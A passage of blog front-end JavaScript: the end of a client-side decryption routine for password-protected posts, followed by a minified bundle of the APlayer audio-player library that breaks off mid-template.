      document.querySelectorAll('img').forEach((elem) => {
        if (elem.getAttribute("data-src") && !elem.src) {
          elem.src = elem.getAttribute('data-src');
        }
      });

      // TOC part
      var tocDiv = document.getElementById("toc-div");
      if (tocDiv) {
        tocDiv.style.display = 'inline';
      }

      var tocDivs = document.getElementsByClassName('toc-div-class');
      if (tocDivs && tocDivs.length > 0) {
        for (var idx = 0; idx < tocDivs.length; idx++) {
          tocDivs[idx].style.display = 'inline';
        }
      }

      return await verifyContent(hmacKey, decoded);
    }).catch((e) => {
      alert(wrongPassMessage);
      console.log(e);
      return false;
    });

    return result;

  }

  function hbeLoader() {

    const oldStorageData = JSON.parse(storage.getItem(storageName));

    if (oldStorageData) {
      console.log(`Password got from localStorage(${storageName}): `, oldStorageData);

      const sIv = hexToArray(oldStorageData.iv).buffer;
      const sDk = oldStorageData.dk;
      const sHmk = oldStorageData.hmk;

      cryptoObj.subtle.importKey('jwk', sDk, {
        'name': 'AES-CBC',
        'length': 256,
      }, true, [
        'decrypt',
      ]).then((dkCK) => {
        cryptoObj.subtle.importKey('jwk', sHmk, {
          'name': 'HMAC',
          'hash': 'SHA-256',
          'length': 256,
        }, true, [
          'verify',
        ]).then((hmkCK) => {
          decrypt(dkCK, sIv, hmkCK).then((result) => {
            if (!result) {
              storage.removeItem(storageName);
            }
          });
        });
      });
    }

    mainElement.addEventListener('keydown', async (event) => {
      if (event.isComposing || event.keyCode === 13) {
        const password = document.getElementById('hbePass').value;
        const keyMaterial = await getKeyMaterial(password);
        const hmacKey = await getHmacKey(keyMaterial);
        const decryptKey = await getDecryptKey(keyMaterial);
        const iv = await getIv(keyMaterial);

        decrypt(decryptKey, iv, hmacKey).then((result) => {
          console.log(`Decrypt result: ${result}`);
          if (result) {
            cryptoObj.subtle.exportKey('jwk', decryptKey).then((dk) => {
              cryptoObj.subtle.exportKey('jwk', hmacKey).then((hmk) => {
                const newStorageData = {
                  'dk': dk,
                  'iv': arrayBufferToHex(iv),
                  'hmk': hmk,
                };
                storage.setItem(storageName, JSON.stringify(newStorageData));
              });
            });
          }
        });
      }
    });
  }

  hbeLoader();

})();

!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define("APlayer",[],t):"object"==typeof exports?exports.APlayer=t():e.APlayer=t()}(window,function(){return function(e){var t={};function n(i){if(t[i])return t[i].exports;var a=t[i]={i:i,l:!1,exports:{}};return e[i].call(a.exports,a,a.exports,n),a.l=!0,a.exports}return n.m=e,n.c=t,n.d=function(e,t,i){n.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:i})},n.r=function(e){Object.defineProperty(e,"__esModule",{value:!0})},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="/",n(n.s=41)}([function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=/mobile/i.test(window.navigator.userAgent),a={secondToTime:function(e){var t=Math.floor(e/3600),n=Math.floor((e-3600*t)/60),i=Math.floor(e-3600*t-60*n);return(t>0?[t,n,i]:[n,i]).map(function(e){return e<10?"0"+e:""+e}).join(":")},getElementViewLeft:function(e){var t=e.offsetLeft,n=e.offsetParent,i=document.body.scrollLeft+document.documentElement.scrollLeft;if(document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement)for(;null!==n&&n!==e;)t+=n.offsetLeft,n=n.offsetParent;else for(;null!==n;)t+=n.offsetLeft,n=n.offsetParent;return t-i},getElementViewTop:function(e,t){for(var n,i=e.offsetTop,a=e.offsetParent;null!==a;)i+=a.offsetTop,a=a.offsetParent;return n=document.body.scrollTop+document.documentElement.scrollTop,t?i:i-n},isMobile:i,storage:{set:function(e,t){localStorage.setItem(e,t)},get:function(e){return localStorage.getItem(e)}},nameMap:{dragStart:i?"touchstart":"mousedown",dragMove:i?"touchmove":"mousemove",dragEnd:i?"touchend":"mouseup"},randomOrder:function(e){return function(e){for(var t=e.length-1;t>=0;t--){var n=Math.floor(Math.random()*(t+1)),i=e[n];e[n]=e[t],e[t]=i}return e}([].concat(function(e){if(Array.isArray(e)){for(var t=0,n=Array(e.length);t<e.length;t++)n[t]=e[t];return n}return Array.from(e)}(Array(e))).map(function(e,t){return t}))}};t.default=a},function(e,t,n){var i=n(2);e.exports=function(e){"use strict";e=e||{};var t="",n=i.$each,a=e.audio,r=(e.$value,e.$index,i.$escape),o=e.theme,s=e.index;return n(a,function(e,n){t+='\n<li>\n    <span class="aplayer-list-cur" style="background-color: ',t+=r(e.theme||o),t+=';"></span>\n    <span class="aplayer-list-index">',t+=r(n+s),t+='</span>\n    <span class="aplayer-list-title">',t+=r(e.name),t+='</span>\n    <span class="aplayer-list-author">',t+=r(e.artist),t+="</span>\n</li>\n"}),t}},function(e,t,n){"use strict";e.exports=n(15)},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=g(n(33)),a=g(n(32)),r=g(n(31)),o=g(n(30)),s=g(n(29)),l=g(n(28)),u=g(n(27)),c=g(n(26)),p=g(n(25)),d=g(n(24)),h=g(n(23)),y=g(n(22)),f=g(n(21)),v=g(n(20)),m=g(n(19));function g(e){return e&&e.__esModule?e:{default:e}}var w={play:i.default,pause:a.default,volumeUp:r.default,volumeDown:o.default,volumeOff:s.default,orderRandom:l.default,orderList:u.default,menu:c.default,loopAll:p.default,loopOne:d.default,loopNone:h.default,loading:y.default,right:f.default,skip:v.default,lrc:m.default};t.default=w},function(e,t,n){"use strict";var i,a="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e};i=function(){return this}();try{i=i||Function("return this")()||(0,eval)("this")}catch(e){"object"===("undefined"==typeof window?"undefined":a(window))&&(i=window)}e.exports=i},function(e,t,n){"use strict";var i,a,r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e};void 0===(a="function"==typeof(i=function(){if("object"===("undefined"==typeof window?"undefined":r(window))&&void 0!==document.querySelectorAll&&void 0!==window.pageYOffset&&void 0!==history.pushState){var e=function(e,t,n,i){return n>i?t:e+(t-e)*((a=n/i)<.5?4*a*a*a:(a-1)*(2*a-2)*(2*a-2)+1);var a},t=function(t,n,i,a){n=n||500;var r=(a=a||window).scrollTop||window.pageYOffset;if("number"==typeof t)var o=parseInt(t);else var o=function(e,t){return"HTML"===e.nodeName?-t:e.getBoundingClientRect().top+t}(t,r);var s=Date.now(),l=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||function(e){window.setTimeout(e,15)};!function u(){var c=Date.now()-s;a!==window?a.scrollTop=e(r,o,c,n):window.scroll(0,e(r,o,c,n)),c>n?"function"==typeof i&&i(t):l(u)}()},n=function(e){if(!e.defaultPrevented){e.preventDefault(),location.hash!==this.hash&&window.history.pushState(null,null,this.hash);var n=document.getElementById(this.hash.substring(1));if(!n)return;t(n,500,function(e){location.replace("#"+e.id)})}};return document.addEventListener("DOMContentLoaded",function(){for(var e,t=document.querySelectorAll('a[href^="#"]:not([href="#"])'),i=t.length;e=t[--i];)e.addEventListener("click",n,!1)}),t}})?i.call(t,n,t,e):i)||(e.exports=a)},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),a=s(n(1)),r=s(n(0)),o=s(n(5));function s(e){return e&&e.__esModule?e:{default:e}}var l=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.player=t,this.index=0,this.audios=this.player.options.audio,this.bindEvents()}return i(e,[{key:"bindEvents",value:function(){var e=this;this.player.template.list.addEventListener("click",function(t){var n=void 0;n="LI"===t.target.tagName.toUpperCase()?t.target:t.target.parentElement;var i=parseInt(n.getElementsByClassName("aplayer-list-index")[0].innerHTML)-1;i!==e.index?(e.switch(i),e.player.play()):e.player.toggle()})}},{key:"show",value:function(){this.player.events.trigger("listshow"),this.player.template.list.classList.remove("aplayer-list-hide"),this.player.template.listOl.scrollTop=33*this.index}},{key:"hide",value:function(){this.player.events.trigger("listhide"),this.player.template.list.classList.add("aplayer-list-hide")}},{key:"toggle",value:function(){this.player.template.list.classList.contains("aplayer-list-hide")?this.show():this.hide()}},{key:"add",value:function(e){this.player.events.trigger("listadd",{audios:e}),"[object Array]"!==Object.prototype.toString.call(e)&&(e=[e]),e.map(function(e){return e.name=e.name||e.title||"Audio name",e.artist=e.artist||e.author||"Audio artist",e.cover=e.cover||e.pic,e.type=e.type||"normal",e});var t=!(this.audios.length>1),n=0===this.audios.length;this.player.template.listOl.innerHTML+=(0,a.default)({theme:this.player.options.theme,audio:e,index:this.audios.length+1}),this.audios=this.audios.concat(e),t&&this.audios.length>1&&this.player.container.classList.add("aplayer-withlist"),this.player.randomOrder=r.default.randomOrder(this.audios.length),this.player.template.listCurs=this.player.container.querySelectorAll(".aplayer-list-cur"),this.player.template.listCurs[this.audios.length-1].style.backgroundColor=e.theme||this.player.options.theme,n&&("random"===this.player.options.order?this.switch(this.player.randomOrder[0]):this.switch(0))}},{key:"remove",value:function(e){if(this.player.events.trigger("listremove",{index:e}),this.audios[e])if(this.audios.length>1){var t=this.player.container.querySelectorAll(".aplayer-list li");t[e].remove(),this.audios.splice(e,1),this.player.lrc&&this.player.lrc.remove(e),e===this.index&&(this.audios[e]?this.switch(e):this.switch(e-1)),this.index>e&&this.index--;for(var n=e;n<t.length;n++)t[n].getElementsByClassName("aplayer-list-index")[0].textContent=n;1===this.audios.length&&this.player.container.classList.remove("aplayer-withlist"),this.player.template.listCurs=this.player.container.querySelectorAll(".aplayer-list-cur")}else this.clear()}},{key:"switch",value:function(e){if(this.player.events.trigger("listswitch",{index:e}),void 0!==e&&this.audios[e]){this.index=e;var t=this.audios[this.index];this.player.template.pic.style.backgroundImage=t.cover?"url('"+t.cover+"')":"",this.player.theme(this.audios[this.index].theme||this.player.options.theme,this.index,!1),this.player.template.title.innerHTML=t.name,this.player.template.author.innerHTML=t.artist?" - "+t.artist:"";var n=this.player.container.getElementsByClassName("aplayer-list-light")[0];n&&n.classList.remove("aplayer-list-light"),this.player.container.querySelectorAll(".aplayer-list li")[this.index].classList.add("aplayer-list-light"),(0,o.default)(33*this.index,500,null,this.player.template.listOl),this.player.setAudio(t),this.player.lrc&&this.player.lrc.switch(this.index),this.player.lrc&&this.player.lrc.update(0),1!==this.player.duration&&(this.player.template.dtime.innerHTML=r.default.secondToTime(this.player.duration))}}},{key:"clear",value:function(){this.player.events.trigger("listclear"),this.index=0,this.player.container.classList.remove("aplayer-withlist"),this.player.pause(),this.audios=[],this.player.lrc&&this.player.lrc.clear(),this.player.audio.src="",this.player.template.listOl.innerHTML="",this.player.template.pic.style.backgroundImage="",this.player.theme(this.player.options.theme,this.index,!1),this.player.template.title.innerHTML="No audio",this.player.template.author.innerHTML="",this.player.bar.set("loaded",0,"width"),this.player.template.dtime.innerHTML=r.default.secondToTime(0)}}]),e}();t.default=l},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}();var a=function(){function e(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.events={},this.audioEvents=["abort","canplay","canplaythrough","durationchange","emptied","ended","error","loadeddata","loadedmetadata","loadstart","mozaudioavailable","pause","play","playing","progress","ratechange","seeked","seeking","stalled","suspend","timeupdate","volumechange","waiting"],this.playerEvents=["destroy","listshow","listhide","listadd","listremove","listswitch","listclear","noticeshow","noticehide","lrcshow","lrchide"]}return i(e,[{key:"on",value:function(e,t){this.type(e)&&"function"==typeof t&&(this.events[e]||(this.events[e]=[]),this.events[e].push(t))}},{key:"trigger",value:function(e,t){if(this.events[e]&&this.events[e].length)for(var n=0;n<this.events[e].length;n++)this.events[e][n](t)}},{key:"type",value:function(e){return-1!==this.playerEvents.indexOf(e)?"player":-1!==this.audioEvents.indexOf(e)?"audio":(console.error("Unknown event name: "+e),null)}}]),e}();t.default=a},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}();var a=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.player=t,window.requestAnimationFrame=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(e){window.setTimeout(e,1e3/60)},this.types=["loading"],this.init()}return i(e,[{key:"init",value:function(){var e=this;this.types.forEach(function(t){e["init"+t+"Checker"]()})}},{key:"initloadingChecker",value:function(){var e=this,t=0,n=0,i=!1;this.loadingChecker=setInterval(function(){e.enableloadingChecker&&(n=e.player.audio.currentTime,i||n!==t||e.player.audio.paused||(e.player.container.classList.add("aplayer-loading"),i=!0),i&&n>t&&!e.player.audio.paused&&(e.player.container.classList.remove("aplayer-loading"),i=!1),t=n)},100)}},{key:"enable",value:function(e){this["enable"+e+"Checker"]=!0,"fps"===e&&this.initfpsChecker()}},{key:"disable",value:function(e){this["enable"+e+"Checker"]=!1}},{key:"destroy",value:function(){var e=this;this.types.forEach(function(t){e["enable"+t+"Checker"]=!1,e[t+"Checker"]&&clearInterval(e[t+"Checker"])})}}]),e}();t.default=a},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),a=o(n(0)),r=o(n(3));function o(e){return e&&e.__esModule?e:{default:e}}var s=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.player=t,this.initPlayButton(),this.initPlayBar(),this.initOrderButton(),this.initLoopButton(),this.initMenuButton(),a.default.isMobile||this.initVolumeButton(),this.initMiniSwitcher(),this.initSkipButton(),this.initLrcButton()}return i(e,[{key:"initPlayButton",value:function(){var e=this;this.player.template.pic.addEventListener("click",function(){e.player.toggle()})}},{key:"initPlayBar",value:function(){var e=this,t=function(t){var n=((t.clientX||t.changedTouches[0].clientX)-a.default.getElementViewLeft(e.player.template.barWrap))/e.player.template.barWrap.clientWidth;n=Math.max(n,0),n=Math.min(n,1),e.player.bar.set("played",n,"width"),e.player.lrc&&e.player.lrc.update(n*e.player.duration),e.player.template.ptime.innerHTML=a.default.secondToTime(n*e.player.duration)},n=function n(i){document.removeEventListener(a.default.nameMap.dragEnd,n),document.removeEventListener(a.default.nameMap.dragMove,t);var r=((i.clientX||i.changedTouches[0].clientX)-a.default.getElementViewLeft(e.player.template.barWrap))/e.player.template.barWrap.clientWidth;r=Math.max(r,0),r=Math.min(r,1),e.player.bar.set("played",r,"width"),e.player.seek(e.player.bar.get("played","width")*e.player.duration),e.player.disableTimeupdate=!1};this.player.template.barWrap.addEventListener(a.default.nameMap.dragStart,function(){e.player.disableTimeupdate=!0,document.addEventListener(a.default.nameMap.dragMove,t),document.addEventListener(a.default.nameMap.dragEnd,n)})}},{key:"initVolumeButton",value:function(){var e=this;this.player.template.volumeButton.addEventListener("click",function(){e.player.audio.muted?(e.player.audio.muted=!1,e.player.switchVolumeIcon(),e.player.bar.set("volume",e.player.volume(),"height")):(e.player.audio.muted=!0,e.player.switchVolumeIcon(),e.player.bar.set("volume",0,"height"))});var t=function(t){var n=1-((t.clientY||t.changedTouches[0].clientY)-a.default.getElementViewTop(e.player.template.volumeBar,e.player.options.fixed))/e.player.template.volumeBar.clientHeight;n=Math.max(n,0),n=Math.min(n,1),e.player.volume(n)},n=function n(i){e.player.template.volumeBarWrap.classList.remove("aplayer-volume-bar-wrap-active"),document.removeEventListener(a.default.nameMap.dragEnd,n),document.removeEventListener(a.default.nameMap.dragMove,t);var r=1-((i.clientY||i.changedTouches[0].clientY)-a.default.getElementViewTop(e.player.template.volumeBar,e.player.options.fixed))/e.player.template.volumeBar.clientHeight;r=Math.max(r,0),r=Math.min(r,1),e.player.volume(r)};this.player.template.volumeBarWrap.addEventListener(a.default.nameMap.dragStart,function(){e.player.template.volumeBarWrap.classList.add("aplayer-volume-bar-wrap-active"),document.addEventListener(a.default.nameMap.dragMove,t),document.addEventListener(a.default.nameMap.dragEnd,n)})}},{key:"initOrderButton",value:function(){var e=this;this.player.template.order.addEventListener("click",function(){"list"===e.player.options.order?(e.player.options.order="random",e.player.template.order.innerHTML=r.default.orderRandom):"random"===e.player.options.order&&(e.player.options.order="list",e.player.template.order.innerHTML=r.default.orderList)})}},{key:"initLoopButton",value:function(){var e=this;this.player.template.loop.addEventListener("click",function(){e.player.list.audios.length>1?"one"===e.player.options.loop?(e.player.options.loop="none",e.player.template.loop.innerHTML=r.default.loopNone):"none"===e.player.options.loop?(e.player.options.loop="all",e.player.template.loop.innerHTML=r.default.loopAll):"all"===e.player.options.loop&&(e.player.options.loop="one",e.player.template.loop.innerHTML=r.default.loopOne):"one"===e.player.options.loop||"all"===e.player.options.loop?(e.player.options.loop="none",e.player.template.loop.innerHTML=r.default.loopNone):"none"===e.player.options.loop&&(e.player.options.loop="all",e.player.template.loop.innerHTML=r.default.loopAll)})}},{key:"initMenuButton",value:function(){var e=this;this.player.template.menu.addEventListener("click",function(){e.player.list.toggle()})}},{key:"initMiniSwitcher",value:function(){var e=this;this.player.template.miniSwitcher.addEventListener("click",function(){e.player.setMode("mini"===e.player.mode?"normal":"mini")})}},{key:"initSkipButton",value:function(){var e=this;this.player.template.skipBackButton.addEventListener("click",function(){e.player.skipBack()}),this.player.template.skipForwardButton.addEventListener("click",function(){e.player.skipForward()}),this.player.template.skipPlayButton.addEventListener("click",function(){e.player.toggle()})}},{key:"initLrcButton",value:function(){var e=this;this.player.template.lrcButton.addEventListener("click",function(){e.player.template.lrcButton.classList.contains("aplayer-icon-lrc-inactivity")?(e.player.template.lrcButton.classList.remove("aplayer-icon-lrc-inactivity"),e.player.lrc&&e.player.lrc.show()):(e.player.template.lrcButton.classList.add("aplayer-icon-lrc-inactivity"),e.player.lrc&&e.player.lrc.hide())})}}]),e}();t.default=s},function(e,t,n){var i=n(2);e.exports=function(e){"use strict";e=e||{};var t="",n=i.$each,a=e.lyrics,r=(e.$value,e.$index,i.$escape);return n(a,function(e,n){t+="\n    <p",0===n&&(t+=' class="aplayer-lrc-current"'),t+=">",t+=r(e[1]),t+="</p>\n"}),t}},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i,a=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=n(10),o=(i=r)&&i.__esModule?i:{default:i};var s=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.container=t.container,this.async=t.async,this.player=t.player,this.parsed=[],this.index=0,this.current=[]}return a(e,[{key:"show",value:function(){this.player.events.trigger("lrcshow"),this.player.template.lrcWrap.classList.remove("aplayer-lrc-hide")}},{key:"hide",value:function(){this.player.events.trigger("lrchide"),this.player.template.lrcWrap.classList.add("aplayer-lrc-hide")}},{key:"toggle",value:function(){this.player.template.lrcWrap.classList.contains("aplayer-lrc-hide")?this.show():this.hide()}},{key:"update",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.player.audio.currentTime;if(this.index>this.current.length-1||e<this.current[this.index][0]||!this.current[this.index+1]||e>=this.current[this.index+1][0])for(var t=0;t<this.current.length;t++)e>=this.current[t][0]&&(!this.current[t+1]||e<this.current[t+1][0])&&(this.index=t,this.container.style.transform="translateY("+16*-this.index+"px)",this.container.style.webkitTransform="translateY("+16*-this.index+"px)",this.container.getElementsByClassName("aplayer-lrc-current")[0].classList.remove("aplayer-lrc-current"),this.container.getElementsByTagName("p")[t].classList.add("aplayer-lrc-current"))}},{key:"switch",value:function(e){var t=this;if(!this.parsed[e])if(this.async){this.parsed[e]=[["00:00","Loading"]];var n=new XMLHttpRequest;n.onreadystatechange=function(){e===t.player.list.index&&4===n.readyState&&(n.status>=200&&n.status<300||304===n.status?t.parsed[e]=t.parse(n.responseText):(t.player.notice("LRC file request fails: status "+n.status),t.parsed[e]=[["00:00","Not available"]]),t.container.innerHTML=(0,o.default)({lyrics:t.parsed[e]}),t.update(0),t.current=t.parsed[e])};var i=this.player.list.audios[e].lrc;n.open("get",i,!0),n.send(null)}else this.player.list.audios[e].lrc?this.parsed[e]=this.parse(this.player.list.audios[e].lrc):this.parsed[e]=[["00:00","Not available"]];this.container.innerHTML=(0,o.default)({lyrics:this.parsed[e]}),this.update(0),this.current=this.parsed[e]}},{key:"parse",value:function(e){if(e){for(var t=(e=e.replace(/([^\]^\n])\[/g,function(e,t){return t+"\n["})).split("\n"),n=[],i=t.length,a=0;a<i;a++){var r=t[a].match(/\[(\d{2}):(\d{2})(\.(\d{2,3}))?]/g),o=t[a].replace(/.*\[(\d{2}):(\d{2})(\.(\d{2,3}))?]/g,"").replace(/<(\d{2}):(\d{2})(\.(\d{2,3}))?>/g,"").replace(/^\s+|\s+$/g,"");if(r)for(var s=r.length,l=0;l<s;l++){var u=/\[(\d{2}):(\d{2})(\.(\d{2,3}))?]/.exec(r[l]),c=60*u[1]+parseInt(u[2])+(u[4]?parseInt(u[4])/(2===(u[4]+"").length?100:1e3):0);n.push([c,o])}}return(n=n.filter(function(e){return e[1]})).sort(function(e,t){return e[0]-t[0]}),n}return[]}},{key:"remove",value:function(e){this.parsed.splice(e,1)}},{key:"clear",value:function(){this.parsed=[],this.container.innerHTML=""}}]),e}();t.default=s},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i,a=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=n(0),o=(i=r)&&i.__esModule?i:{default:i};var s=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.storageName=t.options.storageName,this.data=JSON.parse(o.default.storage.get(this.storageName)),this.data||(this.data={}),this.data.volume=this.data.volume||t.options.volume}return a(e,[{key:"get",value:function(e){return this.data[e]}},{key:"set",value:function(e,t){this.data[e]=t,o.default.storage.set(this.storageName,JSON.stringify(this.data))}}]),e}();t.default=s},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}();var a=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.elements={},this.elements.volume=t.volume,this.elements.played=t.played,this.elements.loaded=t.loaded}return i(e,[{key:"set",value:function(e,t,n){t=Math.max(t,0),t=Math.min(t,1),this.elements[e].style[n]=100*t+"%"}},{key:"get",value:function(e,t){return parseFloat(this.elements[e].style[t])/100}}]),e}();t.default=a},function(e,t,n){"use strict";(function(t){e.exports=!1;try{e.exports="[object process]"===Object.prototype.toString.call(t.process)}catch(e){}}).call(this,n(4))},function(e,t,n){"use strict";(function(t){var i=n(14),a=Object.create(i?t:window),r=/["&'<>]/;a.$escape=function(e){return function(e){var t=""+e,n=r.exec(t);if(!n)return e;var i="",a=void 0,o=void 0,s=void 0;for(a=n.index,o=0;a<t.length;a++){switch(t.charCodeAt(a)){case 34:s="&#34;";break;case 38:s="&#38;";break;case 39:s="&#39;";break;case 60:s="&#60;";break;case 62:s="&#62;";break;default:continue}o!==a&&(i+=t.substring(o,a)),o=a+1,i+=s}return o!==a?i+t.substring(o,a):i}(function e(t){"string"!=typeof t&&(t=void 0===t||null===t?"":"function"==typeof t?e(t.call(t)):JSON.stringify(t));return t}(e))},a.$each=function(e,t){if(Array.isArray(e))for(var n=0,i=e.length;n<i;n++)t(e[n],n);else for(var a in e)t(e[a],a)},e.exports=a}).call(this,n(4))},function(e,t,n){var i=n(2);e.exports=function(e){"use strict";var t="",a=(e=e||{}).options,r=e.cover,o=i.$escape,s=e.icons,l=(arguments[1],function(e){return t+=e}),u=e.getObject;e.theme,e.audio,e.index;return a.fixed?(t+='\n<div class="aplayer-list',a.listFolded&&(t+=" aplayer-list-hide"),t+='"',a.listMaxHeight&&(t+=' style="max-height: ',t+=o(a.listMaxHeight),t+='"'),t+=">\n    <ol",a.listMaxHeight&&(t+=' style="max-height: ',t+=o(a.listMaxHeight),t+='"'),t+=">\n        ",l(n(1)(u({theme:a.theme,audio:a.audio,index:1}))),t+='\n    </ol>\n</div>\n<div class="aplayer-body">\n    <div class="aplayer-pic" style="',r&&(t+="background-image: url(&quot;",t+=o(r),t+="&quot;);"),t+="background-color: ",t+=o(a.theme),t+=';">\n        <div class="aplayer-button aplayer-play">',t+=s.play,t+='</div>\n    </div>\n    <div class="aplayer-info" style="display: none;">\n        <div class="aplayer-music">\n            <span class="aplayer-title">No audio</span>\n            <span class="aplayer-author"></span>\n        </div>\n        <div class="aplayer-controller">\n            <div class="aplayer-bar-wrap">\n                <div class="aplayer-bar">\n                    <div class="aplayer-loaded" style="width: 0"></div>\n                    <div class="aplayer-played" style="width: 0; background: ',t+=o(a.theme),t+=';">\n                        <span class="aplayer-thumb" style="background: ',t+=o(a.theme),t+=';">\n                            <span class="aplayer-loading-icon">',t+=s.loading,t+='</span>\n                        </span>\n                    </div>\n                </div>\n            </div>\n            <div class="aplayer-time">\n                <span class="aplayer-time-inner">\n                    <span class="aplayer-ptime">00:00</span> / <span class="aplayer-dtime">00:00</span>\n                </span>\n                <span class="aplayer-icon aplayer-icon-back">\n                    ',t+=s.skip,t+='\n                </span>\n                <span class="aplayer-icon aplayer-icon-play">\n                    ',t+=s.play,t+='\n                </span>\n                <span class="aplayer-icon aplayer-icon-forward">\n                    ',t+=s.skip,t+='\n                </span>\n                <div class="aplayer-volume-wrap">\n                    <button type="button" class="aplayer-icon aplayer-icon-volume-down">\n                        ',t+=s.volumeDown,t+='\n                    </button>\n                    <div class="aplayer-volume-bar-wrap">\n                        <div class="aplayer-volume-bar">\n                            <div class="aplayer-volume" style="height: 80%; background: ',t+=o(a.theme),t+=';"></div>\n                        </div>\n                    </div>\n                </div>\n                <button type="button" class="aplayer-icon aplayer-icon-order">\n                    ',"list"===a.order?t+=s.orderList:"random"===a.order&&(t+=s.orderRandom),t+='\n                </button>\n                <button type="button" class="aplayer-icon aplayer-icon-loop">\n                    ',"one"===a.loop?t+=s.loopOne:"all"===a.loop?t+=s.loopAll:"none"===a.loop&&(t+=s.loopNone),t+='\n                </button>\n                <button type="button" class="aplayer-icon aplayer-icon-menu">\n                    ',t+=s.menu,t+='\n                </button>\n                <button type="button" class="aplayer-icon aplayer-icon-lrc">\n                    ',t+=s.lrc,t+='\n                </button>\n            </div>\n        </div>\n    </div>\n    <div class="aplayer-notice"></div>\n    <div class="aplayer-miniswitcher"><button class="aplayer-icon">',t+=s.right,t+='</button></div>\n</div>\n<div class="aplayer-lrc">\n    <div class="aplayer-lrc-contents" style="transform: translateY(0); -webkit-transform: translateY(0);"></div>\n</div>\n'):(t+='\n<div class="aplayer-body">\n    <div class="aplayer-pic" style="',r&&(t+="background-image: url(&quot;",t+=o(r),t+="&quot;);"),t+="background-color: ",t+=o(a.theme),t+=';">\n        <div class="aplayer-button aplayer-play">',t+=s.play,t+='</div>\n    </div>\n    <div class="aplayer-info">\n        <div class="aplayer-music">\n            <span class="aplayer-title">No audio</span>\n            <span class="aplayer-author"></span>\n        </div>\n        <div class="aplayer-lrc">\n            <div class="aplayer-lrc-contents" style="transform: translateY(0); -webkit-transform: translateY(0);"></div>\n        </div>\n        <div class="aplayer-controller">\n            <div class="aplayer-bar-wrap">\n                <div class="aplayer-bar">\n                    <div class="aplayer-loaded" style="width: 0"></div>\n                    <div class="aplayer-played" style="width: 0; background: ',t+=o(a.theme),t+=';">\n                        <span class="aplayer-thumb" style="background: ',t+=o(a.theme),t+=';">\n                            <span class="aplayer-loading-icon">',t+=s.loading,t+='</span>\n                        </span>\n                    </div>\n                </div>\n            </div>\n            <div class="aplayer-time">\n                <span class="aplayer-time-inner">\n                    <span class="aplayer-ptime">00:00</span> / <span class="aplayer-dtime">00:00</span>\n                </span>\n                <span class="aplayer-icon aplayer-icon-back">\n                    ',t+=s.skip,t+='\n                </span>\n                <span class="aplayer-icon aplayer-icon-play">\n                    ',t+=s.play,t+='\n                </span>\n                <span 